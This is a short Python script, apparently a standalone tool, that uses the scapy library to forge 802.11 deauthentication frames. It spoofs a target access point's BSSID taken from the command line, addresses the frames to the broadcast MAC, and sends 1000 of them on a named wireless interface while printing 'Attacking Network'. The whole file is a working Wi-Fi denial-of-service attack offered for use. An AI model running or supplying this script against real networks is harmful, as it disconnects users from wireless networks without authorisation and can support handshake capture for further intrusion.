#!/usr/bin/python

import sys
from scapy.all import *

brdmac = "ff:ff:ff:ff:ff:ff"

pkt = RadioTap() / Dot11( addr1 = brdmac, addr2 = sys.argv[1], addr3 = sys.argv[1])/ Dot11Deauth()

print "Attacking Network with BSSID %s" %sys.argv[1]

sendp(pkt, iface = "wlx00c0ca82925c", count = 1000, inter = .2)


